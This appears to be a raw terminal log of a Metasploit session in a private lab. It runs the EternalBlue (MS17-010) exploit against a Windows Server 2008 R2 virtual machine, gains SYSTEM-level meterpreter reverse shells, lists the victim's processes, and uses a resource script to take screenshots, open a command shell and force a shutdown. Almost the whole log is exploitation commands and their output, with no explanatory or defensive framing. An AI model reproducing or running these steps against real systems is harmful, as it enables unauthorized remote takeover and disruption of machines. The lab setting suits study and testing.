+Process List
+============
+
+ PID   PPID  Name           Arch  Session  User                   Path
+ ---   ----  ----           ----  -------  ----                   ----
+ 0     0     [System Proce
+             ss]
+ 4     0     System         x64   0
+ 252   4     smss.exe       x64   0        NT AUTHORITY\SYSTEM    \SystemRoot\System32\s
+                                                                  mss.exe
+ 324   312   csrss.exe      x64   0        NT AUTHORITY\SYSTEM    C:\Windows\system32\cs
+                                                                  rss.exe
+ 364   312   wininit.exe    x64   0        NT AUTHORITY\SYSTEM    C:\Windows\system32\wi
+                                                                  ninit.exe
+ 372   356   csrss.exe      x64   1        NT AUTHORITY\SYSTEM    C:\Windows\system32\cs
+                                                                  rss.exe
+ 400   356   winlogon.exe   x64   1        NT AUTHORITY\SYSTEM    C:\Windows\system32\wi
+                                                                  nlogon.exe
+ 460   364   services.exe   x64   0        NT AUTHORITY\SYSTEM    C:\Windows\system32\se
+                                                                  rvices.exe
+ 468   364   lsass.exe      x64   0        NT AUTHORITY\SYSTEM    C:\Windows\system32\ls
+                                                                  ass.exe
+ 476   364   lsm.exe        x64   0        NT AUTHORITY\SYSTEM    C:\Windows\system32\ls
+                                                                  m.exe
+ 552   460   svchost.exe    x64   0        NT AUTHORITY\LOCAL SE
+                                           RVICE
+ 576   460   svchost.exe    x64   0        NT AUTHORITY\SYSTEM
+ 640   460   VBoxService.e  x64   0        NT AUTHORITY\SYSTEM    C:\Windows\System32\VB
+             xe                                                   oxService.exe
+ 704   460   svchost.exe    x64   0        NT AUTHORITY\NETWORK
+                                           SERVICE
+ 768   460   svchost.exe    x64   0        NT AUTHORITY\LOCAL SE
+                                           RVICE
+ 792   1424  explorer.exe   x64   1        VAGRANT-2008R2\vagran  C:\Windows\Explorer.EX
+                                           t                      E
+ 836   460   svchost.exe    x64   0        NT AUTHORITY\SYSTEM
+ 888   460   svchost.exe    x64   0        NT AUTHORITY\LOCAL SE
+                                           RVICE
+ 924   792   cmd.exe        x64   1        VAGRANT-2008R2\vagran  C:\Windows\system32\cm
+                                           t                      d.exe
+ 940   460   svchost.exe    x64   0        NT AUTHORITY\SYSTEM
+ 980   460   svchost.exe    x64   0        NT AUTHORITY\NETWORK
+                                           SERVICE
+ 1156  940   dwm.exe        x64   1        VAGRANT-2008R2\vagran  C:\Windows\system32\Dw
+                                           t                      m.exe
+ 1180  460   spoolsv.exe    x64   0        NT AUTHORITY\SYSTEM    C:\Windows\System32\sp
+                                                                  oolsv.exe
+ 1236  460   svchost.exe    x64   0        NT AUTHORITY\SYSTEM
+ 1260  460   wrapper.exe    x86   0        NT AUTHORITY\LOCAL SE
+                                           RVICE
+ 1348  324   conhost.exe    x64   0        NT AUTHORITY\LOCAL SE  C:\Windows\system32\co
+                                           RVICE                  nhost.exe
+ 1352  460   cygrunsrv.exe  x64   0        VAGRANT-2008R2\sshd_s  C:\Program Files\OpenS
+                                           erver                  SH\bin\cygrunsrv.exe
+ 1364  460   domain1Servic  x64   0        NT AUTHORITY\LOCAL SE
+             e.exe                         RVICE
+ 1416  460   elasticsearch  x64   0        NT AUTHORITY\SYSTEM    C:\Program Files\elast
+             -service-x64.                                        icsearch-1.1.1\bin\ela
+             exe                                                  sticsearch-service-x64
+                                                                  .exe
+ 1432  324   conhost.exe    x64   0        NT AUTHORITY\SYSTEM    C:\Windows\system32\co
+                                                                  nhost.exe
+ 1464  460   svchost.exe    x64   0        NT AUTHORITY\SYSTEM
+ 1492  460   jenkins.exe    x64   0        NT AUTHORITY\LOCAL SE
+                                           RVICE
+ 1512  1260  java.exe       x86   0        NT AUTHORITY\LOCAL SE  C:\ManageEngine\Deskto
+                                           RVICE                  pCentral_Server\jre\bi
+                                                                  n\java.exe
+ 1520  1364  cmd.exe        x64   0        NT AUTHORITY\LOCAL SE  C:\Windows\system32\cm
+                                           RVICE                  d.exe
+ 1536  324   conhost.exe    x64   0        NT AUTHORITY\LOCAL SE  C:\Windows\system32\co
+                                           RVICE                  nhost.exe
+ 1584  1520  java.exe       x64   0        NT AUTHORITY\LOCAL SE  C:\Program Files (x86)
+                                           RVICE                  \Common Files\Oracle\J
+                                                                  ava\javapath\java.exe
+ 1648  324   conhost.exe    x64   0        NT AUTHORITY\LOCAL SE  C:\Windows\system32\co
+                                           RVICE                  nhost.exe
+ 1828  460   jmx.exe        x64   0        NT AUTHORITY\LOCAL SE
+                                           RVICE
+ 1848  324   conhost.exe    x64   0        NT AUTHORITY\LOCAL SE  C:\Windows\system32\co
+                                           RVICE                  nhost.exe
+ 1908  460   msdtc.exe      x64   0        NT AUTHORITY\NETWORK
+                                           SERVICE
+ 1928  460   dcnotificatio  x86   0        NT AUTHORITY\LOCAL SE
+             nserver.exe                   RVICE
+ 1976  460   dcserverhttpd  x86   0        NT AUTHORITY\LOCAL SE
+             .exe                          RVICE
+ 2036  1492  java.exe       x64   0        NT AUTHORITY\LOCAL SE  C:\Program Files (x86)
+                                           RVICE                  \Common Files\Oracle\J
+                                                                  ava\javapath\java.exe
+ 2088  324   conhost.exe    x64   0        VAGRANT-2008R2\sshd_s  C:\Windows\system32\co
+                                           erver                  nhost.exe
+ 2112  460   svchost.exe    x64   0        NT AUTHORITY\LOCAL SE
+                                           RVICE
+ 2120  1976  dcrotatelogs.  x86   0        NT AUTHORITY\LOCAL SE  C:\ManageEngine\Deskto
+             exe                           RVICE                  pCentral_Server\apache
+                                                                  \bin\dcrotatelogs.exe
+ 2128  324   conhost.exe    x64   0        NT AUTHORITY\LOCAL SE  C:\Windows\system32\co
+                                           RVICE                  nhost.exe
+ 2164  2056  sshd.exe       x64   0        VAGRANT-2008R2\sshd_s  C:\Program Files\OpenS
+                                           erver                  SH\usr\sbin\sshd.exe
+ 2184  1976  dcserverhttpd  x86   0        NT AUTHORITY\LOCAL SE  C:\ManageEngine\Deskto
+             .exe                          RVICE                  pCentral_Server\apache
+                                                                  \bin\dcserverhttpd.exe
+ 2228  460   snmp.exe       x64   0        NT AUTHORITY\SYSTEM
+ 2276  1828  cmd.exe        x64   0        NT AUTHORITY\LOCAL SE  C:\Windows\system32\cm
+                                           RVICE                  d.exe
+ 2288  2184  dcrotatelogs.  x86   0        NT AUTHORITY\LOCAL SE  C:\ManageEngine\Deskto
+             exe                           RVICE                  pCentral_Server\apache
+                                                                  \bin\dcrotatelogs.exe
+ 2304  324   conhost.exe    x64   0        NT AUTHORITY\LOCAL SE  C:\Windows\system32\co
+                                           RVICE                  nhost.exe
+ 2312  460   tomcat8.exe    x64   0        NT AUTHORITY\SYSTEM    C:\Program Files\Apach
+                                                                  e Software Foundation\
+                                                                  tomcat\apache-tomcat-8
+                                                                  .0.33\bin\tomcat8.exe
+ 2320  324   conhost.exe    x64   0        NT AUTHORITY\SYSTEM    C:\Windows\system32\co
+                                                                  nhost.exe
+ 2396  2276  java.exe       x64   0        NT AUTHORITY\LOCAL SE  C:\openjdk6\openjdk-1.
+                                           RVICE                  6.0-unofficial-b27-win
+                                                                  dows-amd64\jre\bin\jav
+                                                                  a.exe
+ 2432  460   httpd.exe      x64   0        NT AUTHORITY\LOCAL SE
+                                           RVICE
+ 3168  1584  java.exe       x64   0        NT AUTHORITY\LOCAL SE  C:\Program Files\Java\
+                                           RVICE                  jdk1.8.0_211\bin\java.
+                                                                  exe
+ 3188  324   conhost.exe    x64   0        NT AUTHORITY\LOCAL SE  C:\Windows\system32\co
+                                           RVICE                  nhost.exe
+ 3280  460   mysqld.exe     x64   0        NT AUTHORITY\SYSTEM    c:\wamp\bin\mysql\mysq
+                                                                  l5.5.20\bin\mysqld.exe
+ 3396  2432  httpd.exe      x64   0        NT AUTHORITY\LOCAL SE  C:\wamp\bin\apache\apa
+                                           RVICE                  che2.2.21\bin\httpd.ex
+                                                                  e
+ 3420  460   svchost.exe    x64   0        NT AUTHORITY\SYSTEM    C:\Windows\system32\sv
+                                                                  chost.exe
+ 3744  460   wlms.exe       x64   0        NT AUTHORITY\SYSTEM    C:\Windows\system32\wl
+                                                                  ms\wlms.exe
+ 3944  460   taskhost.exe   x64   1        VAGRANT-2008R2\vagran  C:\Windows\system32\ta
+                                           t                      skhost.exe
+ 4200  460   svchost.exe    x64   0        NT AUTHORITY\LOCAL SE
+                                           RVICE
+ 4232  460   sppsvc.exe     x64   0        NT AUTHORITY\NETWORK
+                                           SERVICE
+ 4372  460   svchost.exe    x64   0        NT AUTHORITY\NETWORK
+                                           SERVICE
+ 4476  460   svchost.exe    x64   0        NT AUTHORITY\NETWORK
+                                           SERVICE
+ 4672  792   VBoxTray.exe   x64   1        VAGRANT-2008R2\vagran  C:\Windows\System32\VB
+                                           t                      oxTray.exe
+ 4724  372   conhost.exe    x64   1        VAGRANT-2008R2\vagran  C:\Windows\system32\co
+                                           t                      nhost.exe
+ 4736  460   UI0Detect.exe  x64   0        NT AUTHORITY\SYSTEM
+ 4756  792   notepad.exe    x64   1        VAGRANT-2008R2\vagran  C:\Windows\system32\no
+                                           t                      tepad.exe
+ 5052  792   DesktopCentra  x86   1        VAGRANT-2008R2\vagran  C:\ManageEngine\Deskto
+             l.exe                         t                      pCentral_Server\bin\De
+                                                                  sktopCentral.exe
+
+[4mmeterpreter[0m > Interrupt: use the 'exit' command to quit
+[4mmeterpreter[0m > background
+[0m[1m[34m[*][0m Backgrounding session 11...
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> sessions -l
+[0m
+Active sessions
+===============
+
+  Id  Name  Type                     Information               Connection
+  --  ----  ----                     -----------               ----------
+  10        meterpreter x64/windows  NT AUTHORITY\SYSTEM @ VA  192.168.56.103:444 -> 192
+                                     GRANT-2008R2              .168.56.104:49595 (192.16
+                                                               8.56.104)
+  11        meterpreter x64/windows  NT AUTHORITY\SYSTEM @ VA  192.168.56.103:444 -> 192
+                                     GRANT-2008R2              .168.56.104:49625 (192.16
+                                                               8.56.104)
+
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> Interrupt: use the 'exit' command to quit
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> sessions -k 10
+[0m[1m[34m[*][0m Killing the following session(s): 10
+[1m[34m[*][0m Killing session 10
+[1m[34m[*][0m 192.168.56.104 - Meterpreter session 10 closed.
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> [1m[34m[*][0m 192.168.56.104 - Meterpreter session 11 closed.  Reason: Died
+
+[0m[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> sessions -k 10l[K
+[0m
+Active sessions
+===============
+
+No active sessions.
+
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> run
+[0m[1m[34m[*][0m Started reverse TCP handler on 192.168.56.103:444 
+[1m[34m[*][0m 192.168.56.104:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[1m[32m[+][0m 192.168.56.104:445    - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (64-bit)
+[1m[34m[*][0m 192.168.56.104:445    - Scanned 1 of 1 hosts (100% complete)
+[1m[32m[+][0m 192.168.56.104:445 - The target is vulnerable.
+[1m[34m[*][0m 192.168.56.104:445 - Connecting to target for exploitation.
+[1m[32m[+][0m 192.168.56.104:445 - Connection established for exploitation.
+[1m[32m[+][0m 192.168.56.104:445 - Target OS selected valid for OS indicated by SMB reply
+[1m[34m[*][0m 192.168.56.104:445 - CORE raw buffer dump (51 bytes)
+[1m[34m[*][0m 192.168.56.104:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2
+[1m[34m[*][0m 192.168.56.104:445 - 0x00000010  30 30 38 20 52 32 20 53 74 61 6e 64 61 72 64 20  008 R2 Standard 
+[1m[34m[*][0m 192.168.56.104:445 - 0x00000020  37 36 30 31 20 53 65 72 76 69 63 65 20 50 61 63  7601 Service Pac
+[1m[34m[*][0m 192.168.56.104:445 - 0x00000030  6b 20 31                                         k 1             
+[1m[32m[+][0m 192.168.56.104:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[1m[34m[*][0m 192.168.56.104:445 - Trying exploit with 12 Groom Allocations.
+[1m[34m[*][0m 192.168.56.104:445 - Sending all but last fragment of exploit packet
+[1m[34m[*][0m 192.168.56.104:445 - Starting non-paged pool grooming
+[1m[32m[+][0m 192.168.56.104:445 - Sending SMBv2 buffers
+[1m[32m[+][0m 192.168.56.104:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[1m[34m[*][0m 192.168.56.104:445 - Sending final SMBv2 buffers.
+[1m[34m[*][0m 192.168.56.104:445 - Sending last fragment of exploit packet!
+[1m[34m[*][0m 192.168.56.104:445 - Receiving response from exploit packet
+[1m[32m[+][0m 192.168.56.104:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[1m[34m[*][0m 192.168.56.104:445 - Sending egg to corrupted connection.
+[1m[34m[*][0m 192.168.56.104:445 - Triggering free of corrupted buffer.
+[1m[34m[*][0m Sending stage (230982 bytes) to 192.168.56.104
+[0m[0m[1m[32m[+][0m 192.168.56.104:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[1m[32m[+][0m 192.168.56.104:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[1m[32m[+][0m 192.168.56.104:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[1m[34m[*][0m Meterpreter session 12 opened (192.168.56.103:444 -> 192.168.56.104:49854) at 2026-08-15 20:31:13 -0400
+
+[0m[4mmeterpreter[0m > sessions -l
+[0mUsage: sessions [options] or sessions [id]
+
+Interact with a different session ID.
+
+OPTIONS:
+
+    -h, --help           Show this message
+    -i, --interact <id>  Interact with a provided session ID
+
+[4mmeterpreter[0m > background
+[0m[1m[34m[*][0m Backgrounding session 12...
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> runsessions -l
+[0m
+Active sessions
+===============
+
+  Id  Name  Type                     Information               Connection
+  --  ----  ----                     -----------               ----------
+  12        meterpreter x64/windows  NT AUTHORITY\SYSTEM @ VA  192.168.56.103:444 -> 192
+                                     GRANT-2008R2              .168.56.104:49854 (192.16
+                                                               8.56.104)
+
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> sessions -i 12 -s apagado_programado.rc
+[0m[1m[34m[*][0m Session 12 (192.168.56.104):
+[1m[34m[*][0m Running apagado_programado.rc on meterpreter session 12 (192.168.56.104)
+[1m[34m[*][0m Processing apagado_programado.rc for ERB directives.
+resource (apagado_programado.rc)> screenshot
+[0mScreenshot saved to: /home/kali/GCckGJVP.jpeg
+resource (apagado_programado.rc)> sleep 300
+[0m[1m[34m[*][0m Telling the target instance to sleep for 300 seconds ...
+[1m[32m[+][0m Target instance has gone to sleep, terminating current session.
+resource (apagado_programado.rc)> screenshot
+[0m[1m[34m[*][0m 192.168.56.104 - Meterpreter session 12 closed.  Reason: Died
+[1m[31m[-][0m Send timed out. Timeout currently 15 seconds, you can configure this with [32msessions --timeout <value> --script <script> <id>[0m
+resource (apagado_programado.rc)> shell
+[0m[1m[31m[-][0m Send timed out. Timeout currently 15 seconds, you can configure this with [32msessions --timeout <value> --script <script> <id>[0m
+resource (apagado_programado.rc)> shutdown /s /t 0
+[0mShutting down...
+[1m[31m[-][0m Send timed out. Timeout currently 15 seconds, you can configure this with [32msessions --timeout <value> --script <script> <id>[0m
+resource (apagado_programado.rc)> exit
+[0m[1m[34m[*][0m Shutting down session: 12
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> run
+[0m[1m[34m[*][0m Started reverse TCP handler on 192.168.56.103:444 
+[1m[34m[*][0m 192.168.56.104:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[1m[32m[+][0m 192.168.56.104:445    - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (64-bit)
+[1m[34m[*][0m 192.168.56.104:445    - Scanned 1 of 1 hosts (100% complete)
+[1m[32m[+][0m 192.168.56.104:445 - The target is vulnerable.
+[1m[34m[*][0m 192.168.56.104:445 - Connecting to target for exploitation.
+[1m[32m[+][0m 192.168.56.104:445 - Connection established for exploitation.
+[1m[32m[+][0m 192.168.56.104:445 - Target OS selected valid for OS indicated by SMB reply
+[1m[34m[*][0m 192.168.56.104:445 - CORE raw buffer dump (51 bytes)
+[1m[34m[*][0m 192.168.56.104:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2
+[1m[34m[*][0m 192.168.56.104:445 - 0x00000010  30 30 38 20 52 32 20 53 74 61 6e 64 61 72 64 20  008 R2 Standard 
+[1m[34m[*][0m 192.168.56.104:445 - 0x00000020  37 36 30 31 20 53 65 72 76 69 63 65 20 50 61 63  7601 Service Pac
+[1m[34m[*][0m 192.168.56.104:445 - 0x00000030  6b 20 31                                         k 1             
+[1m[32m[+][0m 192.168.56.104:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[1m[34m[*][0m 192.168.56.104:445 - Trying exploit with 12 Groom Allocations.
+[1m[34m[*][0m 192.168.56.104:445 - Sending all but last fragment of exploit packet
+[1m[34m[*][0m 192.168.56.104:445 - Starting non-paged pool grooming
+[1m[32m[+][0m 192.168.56.104:445 - Sending SMBv2 buffers
+[1m[32m[+][0m 192.168.56.104:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[1m[34m[*][0m 192.168.56.104:445 - Sending final SMBv2 buffers.
+[1m[34m[*][0m 192.168.56.104:445 - Sending last fragment of exploit packet!
+[1m[34m[*][0m 192.168.56.104:445 - Receiving response from exploit packet
+[1m[32m[+][0m 192.168.56.104:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[1m[34m[*][0m 192.168.56.104:445 - Sending egg to corrupted connection.
+[1m[34m[*][0m 192.168.56.104:445 - Triggering free of corrupted buffer.
+[1m[34m[*][0m Sending stage (230982 bytes) to 192.168.56.104
+[0m[0m[1m[34m[*][0m Meterpreter session 13 opened (192.168.56.103:444 -> 192.168.56.104:49904) at 2026-08-15 20:34:38 -0400
+[1m[32m[+][0m 192.168.56.104:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[1m[32m[+][0m 192.168.56.104:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[1m[32m[+][0m 192.168.56.104:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+[0m[4mmeterpreter[0m > nb[K[Kbackground
+[0m[1m[34m[*][0m Backgrounding session 13...
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> runsessions -i 12 -s apagado_programado.rc
+[0m[1m[31m[-][0m Invalid session identifier: 12
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> sessions -i 12 -s apagado_programado.rcrun[Ksessions -i 12 -s apagado_programado.rcl[K
+[0m
+Active sessions
+===============
+
+  Id  Name  Type                     Information               Connection
+  --  ----  ----                     -----------               ----------
+  13        meterpreter x64/windows  NT AUTHORITY\SYSTEM @ VA  192.168.56.103:444 -> 192
+                                     GRANT-2008R2              .168.56.104:49904 (192.16
+                                                               8.56.104)
+
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> sessions -li 12 -s apagado_programado.rcl[K[Ksessions -i <NUEVO_ID> -s apagado_programa do.rc[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C> -s apagado_programado[P.rc[A[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C> -s apagado_programado.[Prc[A[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C> -s apagado_programado.r[Pc[A[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C> -s apagado_programado.rc[K[A[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C> -s apagado_programado.rc [K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[P
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[P[P1> -s apagado_programado.rc3> -s apagado_programado.rc
+[0m[1m[31m[-][0m Please specify valid session identifier(s)
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> sessions -i <NUEVO_ID> -s apagado_programa do.rc[K[K[K[K[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[Ksessions -i 13 -s apagado_programado.rc
+[0m[1m[34m[*][0m Session 13 (192.168.56.104):
+[1m[34m[*][0m Running apagado_programado.rc on meterpreter session 13 (192.168.56.104)
+[1m[34m[*][0m Processing apagado_programado.rc for ERB directives.
+resource (apagado_programado.rc)> screenshot
+[0mScreenshot saved to: /home/kali/NJyqMEOO.jpeg
+resource (apagado_programado.rc)> shell
+[0mProcess 1428 created.
+Channel 1 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Local Area Connection:
+
+   Connection-specific DNS Suffix  . : 
+   Link-local IPv6 Address . . . . . : fe80::fd63:83a2:85e3:4729%11
+   IPv4 Address. . . . . . . . . . . : 192.168.56.104
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 
+
+Tunnel adapter isatap.{6FEEDED4-FC1E-4857-BEB8-72167D5BDAA6}:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . : 
+
+C:\Windows\system32>[1m[34m[*][0m 192.168.56.104 - Meterpreter session 13 closed.  Reason: Died
+
+Terminate channel 1? [y/N]  [1m[31m[-][0m Send timed out. Timeout currently 15 seconds, you can configure this with [32msessions --timeout <value> --script <script> <id>[0m
+resource (apagado_programado.rc)> timeout /t 300 /nobreak
+[0m[1m[31m[-][0m Unknown command: timeout. Did you mean [32mtimestomp[0m? Run the [32mhelp[0m command for more details.
+resource (apagado_programado.rc)> exit
+[0m[1m[34m[*][0m Shutting down session: 13
+resource (apagado_programado.rc)> screenshot
+[0m[1m[31m[-][0m Send timed out. Timeout currently 15 seconds, you can configure this with [32msessions --timeout <value> --script <script> <id>[0m
+resource (apagado_programado.rc)> shell
+[0m[1m[31m[-][0m Send timed out. Timeout currently 15 seconds, you can configure this with [32msessions --timeout <value> --script <script> <id>[0m
+resource (apagado_programado.rc)> shutdown /s /t 0
+[0mShutting down...
+[1m[31m[-][0m Send timed out. Timeout currently 15 seconds, you can configure this with [32msessions --timeout <value> --script <script> <id>[0m
+resource (apagado_programado.rc)> exit
+[0m[1m[34m[*][0m Shutting down session: 13
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> sessions -i 13 -s apagado_programado.rc<13> -s apagado_programado.rcl[Ki 12 -s apagado_programado.rcrun[Ksessions -i 12 -s apagado_programado.rcrun[K
+[0m[1m[34m[*][0m Started reverse TCP handler on 192.168.56.103:444 
+[1m[34m[*][0m 192.168.56.104:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[1m[31m[-][0m 192.168.56.104:445    - Rex::HostUnreachable: The host (192.168.56.104:445) was unreachable.
+[1m[34m[*][0m 192.168.56.104:445    - Scanned 1 of 1 hosts (100% complete)
+[1m[31m[-][0m 192.168.56.104:445 - The target is not vulnerable.
+[1m[34m[*][0m Exploit completed, but no session was created.
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> 
